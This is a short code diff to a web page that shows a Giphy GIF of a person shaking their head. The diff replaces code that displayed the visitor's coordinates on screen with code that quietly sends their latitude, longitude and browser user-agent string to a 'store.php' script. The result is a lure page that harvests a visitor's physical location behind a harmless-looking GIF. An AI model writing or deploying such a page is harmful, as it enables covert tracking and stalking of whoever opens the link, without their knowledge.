@@ -4,7 +4,6 @@
 
 <iframe src="https://giphy.com/embed/TVywShWAneUdzGMKSm" width="270" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/smh-shaking-head-my-no-TVywShWAneUdzGMKSm">via GIPHY</a></p>
 
-
 <p id="demo"></p>
 
 <script>
@@ -19,8 +18,9 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+    xhttp.send();
 }
 </script>
 
